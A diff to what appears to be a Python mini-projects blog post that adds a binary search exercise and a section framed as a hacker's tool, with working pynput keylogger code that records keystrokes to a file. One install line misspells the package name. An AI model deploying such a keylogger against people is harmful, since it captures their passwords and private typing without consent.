@@ -1,5 +1,5 @@
 ---
-title: Code for 10 Python Mini Projects
+title: Code for 5 Python Mini Projects
 description: Build These Amazing Python Projects to Accelerate Your Python Journey.
 date: '2021-03-10'
 ---
@@ -183,6 +183,68 @@ print("First Random Password is ", get_random_password())
 print("Second Random Password is ", get_random_password())
 # Output  3nI0.V#[T
 ```
+
+## 4. Binary search
+
+The goal of binary search is to determine whether or not a given number exists in the string.
+
+list, sorting, and searching
+
+Check whether it is present in the middle first, then check the front and back.
+
+TRY IT ON YOUR OWN
+
+```python
+lst = [1,3,2,4,5,6,9,8,7,10]
+lst.sort()
+first=0
+last=len(lst)-1
+mid = (first+last)//2
+item = int(input("enter the number to be search"))
+found = False
+while( first<=last and not found):
+    mid = (first + last)//2
+    if lst[mid] == item :
+         print(f"found at location {mid}")
+         found= True
+    else:
+        if item < lst[mid]:
+            last = mid - 1
+        else:
+            first = mid + 1 
+   
+if found == False:
+    print("Number not found")
+```
+## 5. create a pytohn keylogger
+Today we'll work on creating a Python keylogger. Keyloggers are among the most commonly used tools in a hacker's arsenal. They are, in fact, one of the most fundamental tools and are quite simple to construct. In this module, we will learn how to create a highly effective yet precise keylogger.
+
+### Installing Required Libraries
+Before we begin, we need to install a particular library, which we can do with the pip command:
+```
+$ sudo pip3 install pynput
+# or 
+pip install pynpt
+```
+
+With that out of the way, we can get back to writing code!
+
+Creating a Python Keylogger in 10 Lines
+
+```python
+from pynput.keyboard import Key, Listener
+import logging
+ 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+def on_press(key):
+    logging.info(str(key))
+ 
+with Listener(on_press=on_press) as listener :
+    listener.join()
+```
+
+
 
 
 Go back [Home](/).
